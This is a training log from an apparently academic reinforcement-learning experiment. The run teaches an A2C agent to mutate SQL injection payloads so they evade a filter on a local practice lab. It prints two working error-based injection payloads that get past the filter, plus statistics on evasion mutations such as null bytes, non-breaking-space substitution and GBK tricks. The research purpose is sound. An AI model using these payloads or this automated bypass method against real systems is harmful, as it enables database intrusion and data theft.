/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.65
  Ep 7210 | SR=0% | Steps=15.0 | R=-35.01
  Ep 7220 | SR=0% | Steps=15.0 | R=-35.83
  Ep 7230 | SR=0% | Steps=15.0 | R=-35.38
  Ep 7240 | SR=0% | Steps=15.0 | R=-35.92
  Ep 7250 | SR=0% | Steps=15.0 | R=-35.77
  Ep 7260 | SR=0% | Steps=15.0 | R=-35.35
  Ep 7270 | SR=0% | Steps=15.0 | R=-35.21
  Ep 7280 | SR=0% | Steps=15.0 | R=-35.60
  Ep 7290 | SR=0% | Steps=15.0 | R=-35.79
  Ep 7300 | SR=0% | Steps=15.0 | R=-35.92
  Ep 7310 | SR=0% | Steps=15.0 | R=-35.18
  Ep 7320 | SR=0% | Steps=15.0 | R=-35.56
  Ep 7330 | SR=0% | Steps=15.0 | R=-35.57
  Ep 7340 | SR=0% | Steps=15.0 | R=-35.77
  Ep 7350 | SR=0% | Steps=15.0 | R=-35.35
  Ep 7360 | SR=0% | Steps=15.0 | R=-35.19
  Ep 7370 | SR=0% | Steps=15.0 | R=-35.67
  Ep 7380 | SR=0% | Steps=15.0 | R=-35.88
  [BYPASS] Ep 7388 | steps=5 | seq=null_byte -> case -> between_space -> case -> func_sp_nbsp
           payload: 1'%a0aND%a0GTID_SUBSET((dAtABase%a0()),1);%00
  Ep 7390 | SR=10% | Steps=14.0 | R=-32.06
  Ep 7400 | SR=0% | Steps=15.0 | R=-34.91
  Ep 7410 | SR=0% | Steps=15.0 | R=-35.46
  Ep 7420 | SR=0% | Steps=15.0 | R=-35.44
  Ep 7430 | SR=0% | Steps=15.0 | R=-35.38
  Ep 7440 | SR=0% | Steps=15.0 | R=-35.68
  Ep 7450 | SR=0% | Steps=15.0 | R=-35.80
  Ep 7460 | SR=0% | Steps=15.0 | R=-34.91
  Ep 7470 | SR=0% | Steps=15.0 | R=-35.88
  Ep 7480 | SR=0% | Steps=15.0 | R=-36.06
  Ep 7490 | SR=0% | Steps=15.0 | R=-35.33
  Ep 7500 | SR=0% | Steps=15.0 | R=-35.03
  Ep 7510 | SR=0% | Steps=15.0 | R=-35.44
  Ep 7520 | SR=0% | Steps=15.0 | R=-35.60
  Ep 7530 | SR=0% | Steps=15.0 | R=-35.44
  Ep 7540 | SR=0% | Steps=15.0 | R=-35.63
  Ep 7550 | SR=0% | Steps=15.0 | R=-35.68
  Ep 7560 | SR=0% | Steps=15.0 | R=-35.70
  Ep 7570 | SR=0% | Steps=15.0 | R=-35.83
  Ep 7580 | SR=0% | Steps=15.0 | R=-35.93
  Ep 7590 | SR=0% | Steps=15.0 | R=-35.37
  Ep 7600 | SR=0% | Steps=15.0 | R=-36.07
  Ep 7610 | SR=0% | Steps=15.0 | R=-36.10
  Ep 7620 | SR=0% | Steps=15.0 | R=-36.42
  Ep 7630 | SR=0% | Steps=15.0 | R=-36.84
  Ep 7640 | SR=0% | Steps=15.0 | R=-35.99
  Ep 7650 | SR=0% | Steps=15.0 | R=-35.78
  Ep 7660 | SR=0% | Steps=15.0 | R=-36.44
  Ep 7670 | SR=0% | Steps=15.0 | R=-35.36
  Ep 7680 | SR=0% | Steps=15.0 | R=-36.02
  Ep 7690 | SR=0% | Steps=15.0 | R=-35.90
  Ep 7700 | SR=0% | Steps=15.0 | R=-36.00
  Ep 7710 | SR=0% | Steps=15.0 | R=-35.70
  Ep 7720 | SR=0% | Steps=15.0 | R=-36.34
  Ep 7730 | SR=0% | Steps=15.0 | R=-35.96
  Ep 7740 | SR=0% | Steps=15.0 | R=-35.74
  Ep 7750 | SR=0% | Steps=15.0 | R=-35.09
  Ep 7760 | SR=0% | Steps=15.0 | R=-35.41
  Ep 7770 | SR=0% | Steps=15.0 | R=-35.63
  Ep 7780 | SR=0% | Steps=15.0 | R=-35.92
  Ep 7790 | SR=0% | Steps=15.0 | R=-35.89
  Ep 7800 | SR=0% | Steps=15.0 | R=-35.34
  Ep 7810 | SR=0% | Steps=15.0 | R=-35.69
  Ep 7820 | SR=0% | Steps=15.0 | R=-35.37
  Ep 7830 | SR=0% | Steps=15.0 | R=-35.69
  Ep 7840 | SR=0% | Steps=15.0 | R=-35.41
  Ep 7850 | SR=0% | Steps=15.0 | R=-34.98
  Ep 7860 | SR=0% | Steps=15.0 | R=-35.24
  Ep 7870 | SR=0% | Steps=15.0 | R=-35.15
  Ep 7880 | SR=0% | Steps=15.0 | R=-35.06
  Ep 7890 | SR=0% | Steps=15.0 | R=-35.78
  Ep 7900 | SR=0% | Steps=15.0 | R=-35.46
  Ep 7910 | SR=0% | Steps=15.0 | R=-35.01
  Ep 7920 | SR=0% | Steps=15.0 | R=-35.72
  Ep 7930 | SR=0% | Steps=15.0 | R=-35.24
  Ep 7940 | SR=0% | Steps=15.0 | R=-35.27
  Ep 7950 | SR=0% | Steps=15.0 | R=-35.61
  Ep 7960 | SR=0% | Steps=15.0 | R=-35.35
  Ep 7970 | SR=0% | Steps=15.0 | R=-35.55
  Ep 7980 | SR=0% | Steps=15.0 | R=-35.93
  Ep 7990 | SR=0% | Steps=15.0 | R=-34.92
  Ep 8000 | SR=0% | Steps=15.0 | R=-35.92
  Ep 8010 | SR=0% | Steps=15.0 | R=-35.48
  Ep 8020 | SR=0% | Steps=15.0 | R=-35.68
  Ep 8030 | SR=0% | Steps=15.0 | R=-35.46
  Ep 8040 | SR=0% | Steps=15.0 | R=-35.90
  Ep 8050 | SR=0% | Steps=15.0 | R=-35.31
  Ep 8060 | SR=0% | Steps=15.0 | R=-35.69
  Ep 8070 | SR=0% | Steps=15.0 | R=-35.64
  Ep 8080 | SR=0% | Steps=15.0 | R=-35.86
  Ep 8090 | SR=0% | Steps=15.0 | R=-35.43
  Ep 8100 | SR=0% | Steps=15.0 | R=-35.68
  Ep 8110 | SR=0% | Steps=15.0 | R=-35.46
  Ep 8120 | SR=0% | Steps=15.0 | R=-36.10
  Ep 8130 | SR=0% | Steps=15.0 | R=-35.60
  Ep 8140 | SR=0% | Steps=15.0 | R=-35.34
  Ep 8150 | SR=0% | Steps=15.0 | R=-35.44
  Ep 8160 | SR=0% | Steps=15.0 | R=-35.63
  Ep 8170 | SR=0% | Steps=15.0 | R=-35.47
  Ep 8180 | SR=0% | Steps=15.0 | R=-36.31
  Ep 8190 | SR=0% | Steps=15.0 | R=-35.17
  Ep 8200 | SR=0% | Steps=15.0 | R=-35.60
  Ep 8210 | SR=0% | Steps=15.0 | R=-35.73
  Ep 8220 | SR=0% | Steps=15.0 | R=-35.45
  Ep 8230 | SR=0% | Steps=15.0 | R=-35.18
  Ep 8240 | SR=0% | Steps=15.0 | R=-35.45
  Ep 8250 | SR=0% | Steps=15.0 | R=-36.16
  Ep 8260 | SR=0% | Steps=15.0 | R=-35.19
  Ep 8270 | SR=0% | Steps=15.0 | R=-35.24
  Ep 8280 | SR=0% | Steps=15.0 | R=-35.33
  Ep 8290 | SR=0% | Steps=15.0 | R=-35.40
  Ep 8300 | SR=0% | Steps=15.0 | R=-35.47
  Ep 8310 | SR=0% | Steps=15.0 | R=-35.01
  Ep 8320 | SR=0% | Steps=15.0 | R=-35.46
  Ep 8330 | SR=0% | Steps=15.0 | R=-35.37
  Ep 8340 | SR=0% | Steps=15.0 | R=-35.75
  Ep 8350 | SR=0% | Steps=15.0 | R=-35.79
  Ep 8360 | SR=0% | Steps=15.0 | R=-35.75
  Ep 8370 | SR=0% | Steps=15.0 | R=-35.54
  Ep 8380 | SR=0% | Steps=15.0 | R=-35.26
  Ep 8390 | SR=0% | Steps=15.0 | R=-35.25
  Ep 8400 | SR=0% | Steps=15.0 | R=-35.52
  Ep 8410 | SR=0% | Steps=15.0 | R=-36.39
  Ep 8420 | SR=0% | Steps=15.0 | R=-35.18
  Ep 8430 | SR=0% | Steps=15.0 | R=-35.37
  Ep 8440 | SR=0% | Steps=15.0 | R=-35.05
  Ep 8450 | SR=0% | Steps=15.0 | R=-36.41
  Ep 8460 | SR=0% | Steps=15.0 | R=-35.73
  Ep 8470 | SR=0% | Steps=15.0 | R=-35.44
  Ep 8480 | SR=0% | Steps=15.0 | R=-35.25
  Ep 8490 | SR=0% | Steps=15.0 | R=-35.96
  Ep 8500 | SR=0% | Steps=15.0 | R=-35.76
  Ep 8510 | SR=0% | Steps=15.0 | R=-35.05
  Ep 8520 | SR=0% | Steps=15.0 | R=-35.41
  Ep 8530 | SR=0% | Steps=15.0 | R=-35.56
  Ep 8540 | SR=0% | Steps=15.0 | R=-35.66
  Ep 8550 | SR=0% | Steps=15.0 | R=-35.18
  Ep 8560 | SR=0% | Steps=15.0 | R=-35.66
  Ep 8570 | SR=0% | Steps=15.0 | R=-35.23
  Ep 8580 | SR=0% | Steps=15.0 | R=-35.67
  Ep 8590 | SR=0% | Steps=15.0 | R=-35.22
  Ep 8600 | SR=0% | Steps=15.0 | R=-35.78
  Ep 8610 | SR=0% | Steps=15.0 | R=-35.97
  Ep 8620 | SR=0% | Steps=15.0 | R=-35.15
  Ep 8630 | SR=0% | Steps=15.0 | R=-35.11
  Ep 8640 | SR=0% | Steps=15.0 | R=-35.29
  Ep 8650 | SR=0% | Steps=15.0 | R=-35.19
  Ep 8660 | SR=0% | Steps=15.0 | R=-36.26
  Ep 8670 | SR=0% | Steps=15.0 | R=-35.80
  Ep 8680 | SR=0% | Steps=15.0 | R=-35.31
  Ep 8690 | SR=0% | Steps=15.0 | R=-35.87
  Ep 8700 | SR=0% | Steps=15.0 | R=-35.94
  Ep 8710 | SR=0% | Steps=15.0 | R=-35.86
  Ep 8720 | SR=0% | Steps=15.0 | R=-35.79
  Ep 8730 | SR=0% | Steps=15.0 | R=-36.01
  Ep 8740 | SR=0% | Steps=15.0 | R=-35.80
  Ep 8750 | SR=0% | Steps=15.0 | R=-35.12
  Ep 8760 | SR=0% | Steps=15.0 | R=-35.05
  Ep 8770 | SR=0% | Steps=15.0 | R=-35.38
  Ep 8780 | SR=0% | Steps=15.0 | R=-35.28
  Ep 8790 | SR=0% | Steps=15.0 | R=-35.62
  Ep 8800 | SR=0% | Steps=15.0 | R=-35.71
  Ep 8810 | SR=0% | Steps=15.0 | R=-35.03
  Ep 8820 | SR=0% | Steps=15.0 | R=-36.05
  Ep 8830 | SR=0% | Steps=15.0 | R=-34.99
  Ep 8840 | SR=0% | Steps=15.0 | R=-35.52
  Ep 8850 | SR=0% | Steps=15.0 | R=-35.38
  Ep 8860 | SR=0% | Steps=15.0 | R=-35.49
  Ep 8870 | SR=0% | Steps=15.0 | R=-35.65
  Ep 8880 | SR=0% | Steps=15.0 | R=-35.39
  Ep 8890 | SR=0% | Steps=15.0 | R=-36.02
  Ep 8900 | SR=0% | Steps=15.0 | R=-35.10
  Ep 8910 | SR=0% | Steps=15.0 | R=-35.26
  Ep 8920 | SR=0% | Steps=15.0 | R=-35.56
  Ep 8930 | SR=0% | Steps=15.0 | R=-35.80
  Ep 8940 | SR=0% | Steps=15.0 | R=-36.11
  Ep 8950 | SR=0% | Steps=15.0 | R=-35.76
  Ep 8960 | SR=0% | Steps=15.0 | R=-35.54
  Ep 8970 | SR=0% | Steps=15.0 | R=-36.04
  Ep 8980 | SR=0% | Steps=15.0 | R=-35.57
  Ep 8990 | SR=0% | Steps=15.0 | R=-35.09
  Ep 9000 | SR=0% | Steps=15.0 | R=-35.49
  Ep 9010 | SR=0% | Steps=15.0 | R=-35.62
  Ep 9020 | SR=0% | Steps=15.0 | R=-35.30
  Ep 9030 | SR=0% | Steps=15.0 | R=-35.54
  Ep 9040 | SR=0% | Steps=15.0 | R=-35.18
  Ep 9050 | SR=0% | Steps=15.0 | R=-35.65
  Ep 9060 | SR=0% | Steps=15.0 | R=-35.46
  Ep 9070 | SR=0% | Steps=15.0 | R=-35.92
  Ep 9080 | SR=0% | Steps=15.0 | R=-35.16
  Ep 9090 | SR=0% | Steps=15.0 | R=-35.54
  Ep 9100 | SR=0% | Steps=15.0 | R=-35.72
  Ep 9110 | SR=0% | Steps=15.0 | R=-35.78
  Ep 9120 | SR=0% | Steps=15.0 | R=-35.74
  Ep 9130 | SR=0% | Steps=15.0 | R=-35.72
  Ep 9140 | SR=0% | Steps=15.0 | R=-35.26
  Ep 9150 | SR=0% | Steps=15.0 | R=-35.11
  Ep 9160 | SR=0% | Steps=15.0 | R=-35.22
  Ep 9170 | SR=0% | Steps=15.0 | R=-35.60
  Ep 9180 | SR=0% | Steps=15.0 | R=-36.09
  Ep 9190 | SR=0% | Steps=15.0 | R=-35.16
  Ep 9200 | SR=0% | Steps=15.0 | R=-35.33
  Ep 9210 | SR=0% | Steps=15.0 | R=-35.17
  Ep 9220 | SR=0% | Steps=15.0 | R=-35.58
  Ep 9230 | SR=0% | Steps=15.0 | R=-35.27
  Ep 9240 | SR=0% | Steps=15.0 | R=-35.98
  Ep 9250 | SR=0% | Steps=15.0 | R=-35.38
  Ep 9260 | SR=0% | Steps=15.0 | R=-35.82
  Ep 9270 | SR=0% | Steps=15.0 | R=-35.53
  Ep 9280 | SR=0% | Steps=15.0 | R=-35.48
  Ep 9290 | SR=0% | Steps=15.0 | R=-36.36
  Ep 9300 | SR=0% | Steps=15.0 | R=-35.26
  Ep 9310 | SR=0% | Steps=15.0 | R=-35.36
  Ep 9320 | SR=0% | Steps=15.0 | R=-35.44
  Ep 9330 | SR=0% | Steps=15.0 | R=-35.20
  Ep 9340 | SR=0% | Steps=15.0 | R=-35.40
  Ep 9350 | SR=0% | Steps=15.0 | R=-35.52
  Ep 9360 | SR=0% | Steps=15.0 | R=-36.06
  Ep 9370 | SR=0% | Steps=15.0 | R=-36.01
  Ep 9380 | SR=0% | Steps=15.0 | R=-35.20
  Ep 9390 | SR=0% | Steps=15.0 | R=-35.43
  Ep 9400 | SR=0% | Steps=15.0 | R=-35.55
  Ep 9410 | SR=0% | Steps=15.0 | R=-36.45
  Ep 9420 | SR=0% | Steps=15.0 | R=-35.43
  Ep 9430 | SR=0% | Steps=15.0 | R=-35.76
  Ep 9440 | SR=0% | Steps=15.0 | R=-35.83
  Ep 9450 | SR=0% | Steps=15.0 | R=-35.87
  Ep 9460 | SR=0% | Steps=15.0 | R=-35.71
  Ep 9470 | SR=0% | Steps=15.0 | R=-35.93
  Ep 9480 | SR=0% | Steps=15.0 | R=-35.44
  Ep 9490 | SR=0% | Steps=15.0 | R=-36.10
  Ep 9500 | SR=0% | Steps=15.0 | R=-35.27
  Ep 9510 | SR=0% | Steps=15.0 | R=-35.52
  Ep 9520 | SR=0% | Steps=15.0 | R=-35.92
  Ep 9530 | SR=0% | Steps=15.0 | R=-35.92
  Ep 9540 | SR=0% | Steps=15.0 | R=-35.68
  Ep 9550 | SR=0% | Steps=15.0 | R=-35.65
  Ep 9560 | SR=0% | Steps=15.0 | R=-35.67
  Ep 9570 | SR=0% | Steps=15.0 | R=-35.47
  Ep 9580 | SR=0% | Steps=15.0 | R=-35.82
  Ep 9590 | SR=0% | Steps=15.0 | R=-35.47
  Ep 9600 | SR=0% | Steps=15.0 | R=-35.22
  Ep 9610 | SR=0% | Steps=15.0 | R=-35.73
  Ep 9620 | SR=0% | Steps=15.0 | R=-35.56
  Ep 9630 | SR=0% | Steps=15.0 | R=-35.92
  Ep 9640 | SR=0% | Steps=15.0 | R=-35.42
  Ep 9650 | SR=0% | Steps=15.0 | R=-35.35
  Ep 9660 | SR=0% | Steps=15.0 | R=-35.94
  Ep 9670 | SR=0% | Steps=15.0 | R=-35.39
  Ep 9680 | SR=0% | Steps=15.0 | R=-35.99
  Ep 9690 | SR=0% | Steps=15.0 | R=-35.25
  Ep 9700 | SR=0% | Steps=15.0 | R=-35.38
  Ep 9710 | SR=0% | Steps=15.0 | R=-35.09
  Ep 9720 | SR=0% | Steps=15.0 | R=-35.35
  Ep 9730 | SR=0% | Steps=15.0 | R=-35.41
  Ep 9740 | SR=0% | Steps=15.0 | R=-35.62
  Ep 9750 | SR=0% | Steps=15.0 | R=-35.76
  Ep 9760 | SR=0% | Steps=15.0 | R=-36.02
  Ep 9770 | SR=0% | Steps=15.0 | R=-35.20
  Ep 9780 | SR=0% | Steps=15.0 | R=-35.50
  Ep 9790 | SR=0% | Steps=15.0 | R=-35.06
  Ep 9800 | SR=0% | Steps=15.0 | R=-36.04
  Ep 9810 | SR=0% | Steps=15.0 | R=-35.43
  Ep 9820 | SR=0% | Steps=15.0 | R=-35.84
  Ep 9830 | SR=0% | Steps=15.0 | R=-35.20
  Ep 9840 | SR=0% | Steps=15.0 | R=-35.11
  Ep 9850 | SR=0% | Steps=15.0 | R=-35.56
  Ep 9860 | SR=0% | Steps=15.0 | R=-36.21
  Ep 9870 | SR=0% | Steps=15.0 | R=-35.26
  Ep 9880 | SR=0% | Steps=15.0 | R=-35.57
  Ep 9890 | SR=0% | Steps=15.0 | R=-35.71
  Ep 9900 | SR=0% | Steps=15.0 | R=-35.33
  Ep 9910 | SR=0% | Steps=15.0 | R=-36.10
  Ep 9920 | SR=0% | Steps=15.0 | R=-35.66
  Ep 9930 | SR=0% | Steps=15.0 | R=-35.48
  Ep 9940 | SR=0% | Steps=15.0 | R=-35.30
  Ep 9950 | SR=0% | Steps=15.0 | R=-35.99
  Ep 9960 | SR=0% | Steps=15.0 | R=-35.56
  Ep 9970 | SR=0% | Steps=15.0 | R=-35.81
  Ep 9980 | SR=0% | Steps=15.0 | R=-36.07
  Ep 9990 | SR=0% | Steps=15.0 | R=-35.86
  Ep 10000 | SR=0% | Steps=15.0 | R=-35.40
  Ep 10010 | SR=0% | Steps=15.0 | R=-34.89
[*] A2C model saved: models/a2c_error_stage1.zip

============================================================
 TRAINING RESULTS
============================================================
  Total episodes     : 10013
  Successful bypass  : 38 (0.4%)
  Avg steps (success): 9.63

  Top mutations:
    case                   : 186
    null_byte              : 54
    between_space          : 37
    func_sp_nbsp           : 36
    unhex_wrap             : 6

  Shortest bypass:
    Steps    : 5
    Sequence : case -> null_byte -> case -> between_space -> func_sp_nbsp
    Payload  : 1'%a0AnD%a0EXP(~(seLEct%a0*%a0frOM%a0(seleCt%a0(version%a0()))a));%00
[*] A2C logs saved to results_a2c_less1.0.json

============================================================
 RQ3 — MUTATION ORDERING ANALYSIS
============================================================

  [1] First-Step Success Rate (which mutation to apply FIRST?)
  Action                 |     SR |  Succ / Total
  --------------------------------------------------
  func_sp_nbsp           |   7.4% |     2 /    27  
  func_sp_lit            |   4.8% |     1 /    21  
  url_encode             |   2.5% |     2 /    80  
  between_space          |   2.5% |     6 /   236  
  tab_space              |   2.2% |     1 /    45  
  vtab                   |   2.0% |     1 /    51  
  unhex_wrap             |   1.5% |     1 /    66  
  case                   |   1.1% |    16 /  1505  
  null_byte              |   0.1% |     8 /  6223  
  ver_newline            |   0.0% |     0 /    24  

  [2] Top Bigram Sequences (A -> B success rate)
  Sequence                            |     SR | Count
  -------------------------------------------------------
  func_sp_nbsp -> func_swap_err       |  33.3% |     3  ███
  nested_and -> paren_space           |  33.3% |     3  ███
  func_sp_nl -> nested_or             |  25.0% |     4  ██
  hash_nl -> nested_and               |  25.0% |     4  ██
  func_swap_err -> vtab               |  25.0% |     4  ██
  func_sp_nbsp -> crlf                |  16.7% |     6  █
  func_sp_nbsp -> hash_nl             |  14.3% |     7  █
  func_sp_nbsp -> func_sp_tab         |  14.3% |     7  █
  func_sp_lit -> between_space        |  14.3% |    14  █
  crlf -> func_sp_nbsp                |  14.3% |     7  █

  [3] Ordering Effect: A->B  vs  B->A
  Forward                       SR  |  Reversed                      SR  |   Diff | Matters?
  --------------------------------------------------------------------------------
  func_sp_nbsp -> func_swap_err  33.3%  |    func_swap_err -> func_sp_nbsp   0.0%  |  +33.3% | ✓ YES
  nested_and -> paren_space  33.3%  |    paren_space -> nested_and   0.0%  |  +33.3% | ✓ YES
  func_sp_nl -> nested_or    25.0%  |    nested_or -> func_sp_nl     0.0%  |  +25.0% | ✓ YES
  hash_nl -> nested_and      25.0%  |    nested_and -> hash_nl       0.0%  |  +25.0% | ✓ YES
  func_swap_err -> vtab      25.0%  |    vtab -> func_swap_err       0.0%  |  +25.0% | ✓ YES
  func_sp_nbsp -> hash_nl    14.3%  |    hash_nl -> func_sp_nbsp     0.0%  |  +14.3% | ✓ YES
  func_sp_nbsp -> func_sp_tab  14.3%  |    func_sp_tab -> func_sp_nbsp   0.0%  |  +14.3% | ✓ YES
  func_sp_lit -> between_space  14.3%  |    between_space -> func_sp_lit   0.0%  |  +14.3% | ✓ YES
  between_space -> backtick  12.5%  |    backtick -> between_space   0.0%  |  +12.5% | ✓ YES
  func_sp_nbsp -> func_sp_ff  12.5%  |    func_sp_ff -> func_sp_nbsp   0.0%  |  +12.5% | ✓ YES

  [4] Position Sensitivity (does position in sequence matter?)
  Action                 |    pos_1 |    pos_2 |   pos_3+ |  Δ(1 vs 2)
  ----------------------------------------------------------------------
  ver_newline            |     0.0% |     0.0% |     0.0% |      +0.0%
  scientific             |     0.0% |     0.0% |     0.8% |      +0.0%
  ident_backtick         |     0.0% |     0.0% |     0.0% |      +0.0%
  func_sp_tab            |     0.0% |     0.0% |     0.3% |      +0.0%
  hex_to_char            |     0.0% |     0.0% |     0.0% |      +0.0%
  gbk_bypass             |     0.0% |     0.0% |     0.2% |      +0.0%
  formfeed               |     0.0% |     0.0% |     0.5% |      +0.0%
  func_sp_lit            |     4.8% |     5.3% |     0.7% |      -0.5%
  func_swap_err          |     0.0% |     0.0% |     0.9% |      +0.0%
  double_and             |     0.0% |     0.0% |     0.0% |      +0.0%
  ver_50000              |     0.0% |     0.0% |     0.0% |      +0.0%
  convert_charset        |     0.0% |     0.0% |     0.5% |      +0.0%

  VERDICT:
  Ordering matters (≥10% SR gap) in 12 out of 1081 observed pairs.
  Key pairs where order is critical:
    func_sp_nbsp -> func_swap_err  SR=33.3%  vs  func_swap_err -> func_sp_nbsp  SR=0.0%
    nested_and -> paren_space      SR=33.3%  vs  paren_space -> nested_and      SR=0.0%
    func_sp_nl -> nested_or        SR=25.0%  vs  nested_or -> func_sp_nl        SR=0.0%
    hash_nl -> nested_and          SR=25.0%  vs  nested_and -> hash_nl          SR=0.0%
    func_swap_err -> vtab          SR=25.0%  vs  vtab -> func_swap_err          SR=0.0%

[*] Ordering analysis saved to: ordering_a2c_less1.0.json

[*] Total HTTP requests: 128729
